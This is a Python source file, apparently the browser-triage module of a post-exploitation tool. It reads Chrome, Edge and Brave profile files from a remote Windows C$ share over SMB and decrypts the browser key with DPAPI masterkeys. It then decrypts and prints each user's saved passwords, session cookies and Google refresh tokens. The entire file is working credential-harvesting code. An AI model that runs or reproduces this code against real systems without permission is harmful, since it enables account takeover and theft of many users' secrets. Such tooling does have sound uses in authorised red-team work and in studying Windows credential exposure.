import base64
import json
import logging
import tempfile
import sqlite3
from typing import Any, List, Tuple
from dploot.lib.crypto import decrypt_chrome_password

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.lib.utils import datetime_to_time
from dploot.triage.masterkeys import Masterkey
from dataclasses import dataclass


@dataclass
class LoginData:
    winuser: str
    browser: str
    url: str
    username: str
    password: str

    def dump(self) -> None:
        print("[%s LOGIN DATA]" % self.browser.upper())
        print("URL:\t\t%s" % self.url)
        print("Username:\t%s" % self.username)
        if self.password is not None:
            print("Password:\t%s" % self.password)
        print()

    def dump_quiet(self) -> None:
        print(
            f"[{self.browser.upper()}] {self.url} - {self.username}:{self.password}"
        )


@dataclass
class Cookie:
    winuser: str
    browser: str
    host: str
    path: str
    cookie_name: str
    cookie_value: str
    creation_utc: str
    expires_utc: str
    last_access_utc: str

    def dump(self) -> None:
        print("[%s COOKIE DATA]" % self.browser.upper())
        print(f"Host (path):\t\t{self.host} ({self.path})")
        print("Cookie Name:\t\t%s" % self.cookie_name)
        if self.cookie_value is not None:
            print("Cookie Value:\t\t%s" % self.cookie_value)
        print("Creation UTC:\t\t%s" % datetime_to_time(self.creation_utc))
        print("Expires UTC:\t\t%s" % datetime_to_time(self.expires_utc))
        print("Last Access UTC:\t%s" % datetime_to_time(self.last_access_utc))
        print()

    def dump_quiet(self) -> None:
        print(
            f"[{self.browser.upper()}] {self.host}{self.path} - {self.cookie_name}:{self.cookie_value}"
        )


@dataclass
class GoogleRefreshToken:
    winuser: str
    browser: str
    service: str
    token: str

    def dump(self) -> None:
        print("[%s - GOOGLE REFRESH TOKEN]" % self.browser.upper())
        print("Service:\t%s" % self.service)
        print("Token:\t\t%s" % self.token)
        print()

    def dump_quiet(self) -> None:
        print(f"[{self.browser.upper()}] GRT {self.service}:{self.token}")


class BrowserTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    user_google_chrome_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Login Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_msedge_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Login Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_brave_generic_login_path = {
        "aesStateKeyPath": "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "loginDataPath": "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Login Data",
        "webDataPath": "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Web Data",
        "cookiesDataPath": [
            "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Cookies",
            "Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\%s\\Network\\Cookies",
        ],
    }
    user_generic_chrome_paths = {
        "google chrome": user_google_chrome_generic_login_path,
        "msedge": user_msedge_generic_login_path,
        "brave": user_brave_generic_login_path,
    }

    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_secret_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn

        self._users = None
        self.looted_files = {}
        self.masterkeys = masterkeys

        self.per_secret_callback = per_secret_callback

    def triage_browsers(
        self, gather_cookies: bool = False, bypass_shared_violation: bool = False
    ) -> Tuple[List[LoginData], List[Cookie]]:
        credentials = []
        cookies = []

        for user in self.users:
            try:
                user_credentials, user_cookies = self.triage_browsers_for_user(
                    user,
                    gather_cookies,
                    bypass_shared_violation=bypass_shared_violation,
                )
                credentials += user_credentials
                cookies += user_cookies
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return credentials, cookies

    def triage_browsers_for_user(
        self,
        user: str,
        gather_cookies: bool = False,
        bypass_shared_violation: bool = False,
    ) -> Tuple[List[LoginData], List[Cookie]]:
        return self.triage_chrome_browsers_for_user(
            user=user,
            gather_cookies=gather_cookies,
            bypass_shared_violation=bypass_shared_violation,
        )

    def triage_chrome_browsers_for_user(
        self,
        user: str,
        gather_cookies: bool = False,
        bypass_shared_violation: bool = False,
    ) -> Tuple[List[LoginData], List[Cookie]]:
        credentials = []
        cookies = []
        profiles = ["Default"]
        for browser, paths in self.user_generic_chrome_paths.items():
            aeskey = None
            aesStateKey_bytes = self.conn.readFile(
                shareName=self.share,
                path=paths["aesStateKeyPath"] % user,
                bypass_shared_violation=bypass_shared_violation,
                looted_files=self.looted_files
            )
            if aesStateKey_bytes is not None and len(aesStateKey_bytes) > 0:
                logging.debug(
                    f"Found {browser.upper()} AppData files for user {user}"
                )
                aesStateKey_json = json.loads(aesStateKey_bytes)
                profiles = aesStateKey_json['profile']['profiles_order']
                blob = base64.b64decode(aesStateKey_json["os_crypt"]["encrypted_key"])
                if blob[:5] == b"DPAPI":
                    dpapi_blob = blob[5:]
                    masterkey = find_masterkey_for_blob(
                        dpapi_blob, masterkeys=self.masterkeys
                    )
                    if masterkey is not None:
                        aeskey = decrypt_blob(
                            blob_bytes=dpapi_blob, masterkey=masterkey
                        )
            for profile in profiles:
                loginData_bytes = self.conn.readFile(
                    shareName=self.share,
                    path=paths["loginDataPath"] % (user,profile),
                    bypass_shared_violation=bypass_shared_violation,
                    looted_files=self.looted_files
                )
                if (
                    aeskey is not None
                    and loginData_bytes is not None
                    and len(loginData_bytes) > 0
                ):
                    fh = tempfile.NamedTemporaryFile()
                    fh.write(loginData_bytes)
                    fh.seek(0)
                    db = sqlite3.connect(fh.name)
                    cursor = db.cursor()
                    query = cursor.execute(
                        "SELECT action_url, username_value, password_value FROM logins"
                    )
                    lines = query.fetchall()
                    if len(lines) > 0:
                        for url, username, encrypted_password in lines:
                            password = decrypt_chrome_password(encrypted_password, aeskey)
                            login_data_decrypted = LoginData(
                                winuser=user,
                                browser=browser,
                                url=url,
                                username=username,
                                password=password,
                            )
                            credentials.append(login_data_decrypted)
                            if self.per_secret_callback is not None:
                                self.per_secret_callback(login_data_decrypted)
                    fh.close()
                if gather_cookies:
                    for cookiepath in paths["cookiesDataPath"]:
                        cookiesData_bytes = self.conn.readFile(
                            shareName=self.share,
                            path=cookiepath % (user,profile),
                            bypass_shared_violation=bypass_shared_violation,
                            looted_files=self.looted_files
                        )
                        if (
                            aeskey is not None
                            and cookiesData_bytes is not None
                            and len(cookiesData_bytes) > 0
                        ):
                            fh = tempfile.NamedTemporaryFile()
                            fh.write(cookiesData_bytes)
                            fh.seek(0)
                            db = sqlite3.connect(fh.name)
                            cursor = db.cursor()
                            query = cursor.execute(
                                "SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies"
                            )
                            lines = query.fetchall()
                            if len(lines) > 0:
                                for (
                                    creation_utc,
                                    host,
                                    name,
                                    path,
                                    expires_utc,
                                    last_access_utc,
                                    encrypted_cookie,
                                ) in lines:
                                    decrypted_cookie_value = decrypt_chrome_password(
                                        encrypted_cookie, aeskey
                                    )
                                    cookie = Cookie(
                                        winuser=user,
                                        browser=browser,
                                        host=host,
                                        path=path,
                                        cookie_name=name,
                                        cookie_value=decrypted_cookie_value,
                                        creation_utc=creation_utc,
                                        expires_utc=expires_utc,
                                        last_access_utc=last_access_utc,
                                    )
                                    cookies.append(cookie)
                                    if self.per_secret_callback is not None:
                                        self.per_secret_callback(cookie)
                            fh.close()
                webData_bytes = self.conn.readFile(
                    shareName=self.share,
                    path=paths["webDataPath"] % (user,profile),
                    bypass_shared_violation=bypass_shared_violation,
                    looted_files=self.looted_files
                )
                if (
                    aeskey is not None
                    and webData_bytes is not None
                    and len(webData_bytes) > 0
                ):
                    fh = tempfile.NamedTemporaryFile()
                    fh.write(webData_bytes)
                    fh.seek(0)
                    db = sqlite3.connect(fh.name)
                    cursor = db.cursor()
                    query = cursor.execute(
                        "SELECT service, encrypted_token FROM token_service"
                    )
                    lines = query.fetchall()
                    if len(lines) > 0:
                        for service, encrypted_grt in lines:
                            token = decrypt_chrome_password(encrypted_grt, aeskey)
                            google_refresh_token = GoogleRefreshToken(
                                winuser=user, browser=browser, service=service, token=token
                            )
                            credentials.append(google_refresh_token)
                            if self.per_secret_callback is not None:
                                self.per_secret_callback(google_refresh_token)
        return credentials, cookies

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users
